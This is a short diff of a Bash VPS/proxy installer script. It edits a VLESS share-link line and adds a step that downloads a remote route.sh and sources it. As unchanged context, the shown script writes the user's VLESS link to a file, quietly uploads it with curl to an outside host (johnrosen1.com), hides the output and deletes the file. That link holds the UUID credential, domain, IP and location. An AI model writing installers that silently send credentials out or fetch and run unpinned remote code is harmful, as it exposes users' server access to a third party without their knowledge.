@@ -185,7 +185,7 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${mycountry}_${mycity}_${myip})" &> ${myip}.txt
+echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip}))" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
@@ -428,6 +428,9 @@ install_moudles(){
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/trojan.sh
   source trojan.sh
   install_trojan
+  curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/route.sh
+  source route.sh
+  route_test
 }
 
 ## 主菜单
